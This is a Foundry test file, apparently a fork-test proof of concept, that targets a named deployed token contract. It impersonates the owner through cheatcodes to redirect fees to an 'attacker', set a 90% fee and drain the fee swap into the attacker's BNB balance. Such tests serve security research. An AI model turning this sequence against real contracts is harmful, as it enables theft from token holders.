// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Allin {
    function getOwner() external view returns (address);
    function setFeeReceivers(address, address) external;
    function setFees(uint256, uint256, uint256, uint256, uint256) external;
    function tradingStatus(bool) external;
    function swapThreshold() external view returns (uint256);
    function router() external view returns (address);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x05cd34a1D5dF5010F5eDb3412077B3c291DDb7a8;
    address attacker = address(this);
    Allin allin;
    uint256 initialBalance;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        allin = Allin(TARGET);
        vm.label(TARGET, "Allin Token");
        vm.label(attacker, "Attacker");

        // Get owner address from contract
        owner = allin.getOwner();
        vm.label(owner, "Owner");

        // Record initial attacker balance
        initialBalance = address(attacker).balance;
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate owner to set fee receivers
        vm.startPrank(owner);
        allin.setFeeReceivers(address(0), attacker);

        // Step 2: Set excessive marketing fee (90%)
        allin.setFees(0, 0, 0, 9000, 10000);

        // Step 3: Enable trading
        allin.tradingStatus(true);
        vm.stopPrank();

        // Step 4: Inject tokens into contract to meet swapThreshold
        // swapThreshold = _totalSupply / 10000 = 100000000000 * 1e18 / 10000 = 10000000 * 1e18
        uint256 swapThreshold = allin.swapThreshold();
        deal(TARGET, attacker, swapThreshold);

        // Step 5: Approve router to spend tokens
        allin.approve(address(allin.router()), type(uint256).max);

        // Step 6: Transfer tokens to trigger fee collection and swapBack
        // This will collect 90% fees and convert to BNB during swapBack
        allin.transfer(TARGET, swapThreshold);

        // Step 7: Verify attacker received BNB from fees
        uint256 finalBalance = address(attacker).balance;
        assertGt(finalBalance, initialBalance, "Attacker should have received BNB from excessive fees");
        uint256 finalBalanceThis = address(this).balance;
        assertGt(finalBalanceThis, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
